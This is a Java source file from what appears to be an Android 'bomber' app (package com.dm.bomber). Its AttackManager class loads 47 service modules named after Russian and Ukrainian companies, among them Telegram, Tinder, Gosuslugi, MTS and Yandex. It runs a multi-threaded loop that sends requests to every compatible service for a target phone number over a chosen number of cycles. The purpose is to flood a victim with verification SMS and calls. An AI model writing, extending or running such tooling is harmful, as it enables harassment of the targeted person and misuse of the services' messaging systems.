package com.dm.bomber;

import android.util.Log;

import com.dm.bomber.services.Alltime;
import com.dm.bomber.services.Askona;
import com.dm.bomber.services.AtPrime;
import com.dm.bomber.services.CarSmile;
import com.dm.bomber.services.Citilink;
import com.dm.bomber.services.Eldorado;
import com.dm.bomber.services.Farfor;
import com.dm.bomber.services.Fivepost;
import com.dm.bomber.services.GloriaJeans;
import com.dm.bomber.services.ICQ;
import com.dm.bomber.services.Kari;
import com.dm.bomber.services.Lenta;
import com.dm.bomber.services.MTS;
import com.dm.bomber.services.Mcdonalds;
import com.dm.bomber.services.MegafonTV;
import com.dm.bomber.services.Modulebank;
import com.dm.bomber.services.Multiplex;
import com.dm.bomber.services.OK;
import com.dm.bomber.services.Olltv;
import com.dm.bomber.services.ProstoTV;
import com.dm.bomber.services.Pyaterochka;
import com.dm.bomber.services.RendezVous;
import com.dm.bomber.services.Robocredit;
import com.dm.bomber.services.Sephora;
import com.dm.bomber.services.Service;
import com.dm.bomber.services.Sravni;
import com.dm.bomber.services.SushiWok;
import com.dm.bomber.services.Tele2;
import com.dm.bomber.services.Tele2TV;
import com.dm.bomber.services.Telegram;
import com.dm.bomber.services.Ukrzoloto;
import com.dm.bomber.services.Wink;
import com.dm.bomber.services.YandexEda;
import com.dm.bomber.services.YotaTV;
import com.dm.bomber.services.Zdravcity;
import com.dm.bomber.services.Yandex;
import com.dm.bomber.services.MegafonBank;
import com.dm.bomber.services.VoprosRU;
import com.dm.bomber.services.inDriver;
import com.dm.bomber.services.Tinder;
import com.dm.bomber.services.Gosuslugi;
import com.dm.bomber.services.N1RU;
import com.dm.bomber.services.Hoff;
import com.dm.bomber.services.Samokat;
import com.dm.bomber.services.GreenBee;
import com.dm.bomber.services.toGO;
import com.dm.bomber.services.Premier;
import com.dm.bomber.services.Gorparkovka;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Response;

public class AttackManager {
    private static final String TAG = "AttackManager";

    private final OkHttpClient client;
    private final Service[] services;

    private Attack attack;
    private final Callback callback;

    public AttackManager(Callback callback) {
        this.client = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .build();

        this.callback = callback;
        this.services = new Service[]{
                new Kari(), new Modulebank(), new YandexEda(), new ICQ(),
                new Citilink(), new GloriaJeans(), new Alltime(), new Mcdonalds(),
                new Telegram(), new AtPrime(), new MTS(), new CarSmile(),
                new Sravni(), new OK(), new SushiWok(), new Tele2(),
                new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
                new Fivepost(), new Askona(), new Farfor(), new Sephora(),
                new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
                new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
                new Zdravcity(), new Robocredit(), new Yandex(), new MegafonBank(),
                new VoprosRU(), new inDriver(), new Tinder(), new Gosuslugi(),
                new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
                new toGO(), new Premier(), new Gorparkovka()
        };
    }

    public void performAttack(String phoneCode, String phone, int cycles) {
        attack = new Attack(phoneCode, phone, cycles);
        attack.start();
    }

    public boolean hasAttack() {
        return attack != null && attack.isAlive();
    }

    public void stopAttack() {
        attack.interrupt();
        client.dispatcher().cancelAll();
    }

    public List<Service> getUsableServices(String phoneCode) {
        List<Service> usableServices = new ArrayList<>();

        for (Service service : services) {
            if (service.requireCode == null || service.requireCode.equals(phoneCode))
                usableServices.add(service);
        }

        return usableServices;
    }

    public interface Callback {
        void onAttackEnd();

        void onAttackStart(int serviceCount, int numberOfCycles);

        void onProgressChange(int progress);
    }

    private class Attack extends Thread {
        private final String phoneCode;
        private final String phone;
        private final int numberOfCycles;

        private int progress = 0;

        private CountDownLatch tasks;

        public Attack(String phoneCode, String phone, int cycles) {
            super(phone);

            this.phoneCode = phoneCode;
            this.phone = phone;
            this.numberOfCycles = cycles;
        }

        @Override
        public void run() {
            List<Service> usableServices = getUsableServices(phoneCode);

            callback.onAttackStart(usableServices.size(), numberOfCycles);

            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                tasks = new CountDownLatch(usableServices.size());

                for (Service service : usableServices) {
                    service.prepare(phoneCode, phone);

                    client.newCall(service.run()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
                            progress++;
                            tasks.countDown();

                            e.printStackTrace();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, service.getClass().getName() + "  returned an error HTTP code: " + response.code());
                            }

                            progress++;
                            tasks.countDown();

                            callback.onProgressChange(progress);
                        }
                    });
                }

                try {
                    tasks.await();
                } catch (InterruptedException e) {
                    break;
                }
            }

            callback.onAttackEnd();
        }
    }
}